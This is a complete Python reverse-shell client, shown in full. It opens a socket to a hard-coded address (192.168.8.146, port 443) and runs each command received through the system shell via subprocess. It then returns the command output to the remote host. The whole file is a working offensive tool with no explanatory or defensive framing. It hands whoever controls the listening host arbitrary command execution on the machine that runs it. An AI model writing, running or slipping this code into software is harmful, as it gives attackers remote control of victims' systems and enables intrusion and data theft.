import socket
import subprocess

HOST = '192.168.8.146'  
PORT = 443        

def execute_command(command):
    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return output.stdout.decode() + output.stderr.decode()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            data = s.recv(1024).decode()
            if not data:
                break
            result = execute_command(data)
            s.sendall(result.encode())

if __name__ == "__main__":
    main()
